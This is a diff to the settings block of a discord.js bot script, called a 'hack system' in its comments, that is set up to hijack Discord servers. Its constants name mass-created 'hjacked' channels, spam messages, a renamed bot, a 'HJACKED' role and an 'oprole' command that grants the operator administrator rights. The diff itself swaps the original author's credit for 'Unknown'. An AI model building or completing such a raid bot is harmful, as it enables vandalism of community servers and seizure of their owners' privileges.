@@ -14,16 +14,16 @@
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
-const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
+const x_x = "." //linkstart//the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
-const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
+const teext = "hjacked" // Hacked By Unknown //the textchannel name
+const vooice = "HJACKED" // Hacked By Unknown //the voicechannel name
 const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
-const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
-const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
+const spam = "HJACKED" // UNKNOWN //the spam message
+const namee = "HJACKED" // UNKNOWN //the bot name
+const playing = "HJACKED 1 SERVER" // THE UNKNOWN //bot streaming
+const role = 'HJACKED' // UNKNOWN KING//the role name
+const adminstrator = 'OP' // MASTER //the op name
 console.log('BY OROCHIX');
 console.log('Start Hacking System ..')
 client.on('ready', () => {
@@ -34,7 +34,7 @@ client.on('ready', () => {
 client.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
+console.log('      ~            ~  By : UNKNOWN ~           ~    '); //if you share this code make sure you type my copyrights :>
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
